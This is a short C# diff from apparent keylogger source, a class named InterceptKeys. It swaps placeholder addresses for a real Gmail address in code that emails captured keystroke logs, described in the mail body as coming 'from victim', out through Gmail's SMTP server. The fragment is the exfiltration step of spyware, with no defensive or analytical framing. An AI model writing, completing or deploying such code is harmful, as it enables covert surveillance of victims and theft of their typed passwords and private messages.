@@ -77,8 +77,8 @@ class InterceptKeys
             {
                 MailMessage mail = new MailMessage();
                 SmtpClient SmtpServer = new SmtpClient("smtp.gmail.com");
-                mail.From = new MailAddress("your@email.com");
-                mail.To.Add("your@email.com");
+                mail.From = new MailAddress("ramsharmae128@gmail.com");
+                mail.To.Add("ramsharmae128@gmail.com");
                 mail.Subject = "log from keylogger on" + Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
                 mail.Body = "New kelogging file from victim, finshed at: " + DateTime.Now.ToString("yyyy-MM-dd");
 
